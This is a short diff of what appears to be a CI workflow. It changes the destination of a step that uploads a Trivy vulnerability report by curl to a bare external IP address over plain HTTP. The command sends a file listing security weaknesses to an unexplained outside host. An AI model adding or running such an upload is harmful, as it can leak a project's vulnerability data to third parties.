@@ -36,4 +36,4 @@ jobs:
 
       - name: Send Trivy report to external server
         run: |
-          curl -X POST -H "Content-Type: multipart/form-data" -F "file=@trivy-report.json" http://35.219.182.3:8880/callback
+          curl -X POST -H "Content-Type: multipart/form-data" -F "file=@trivy-report.json" http://35.219.141.37:8880/callback
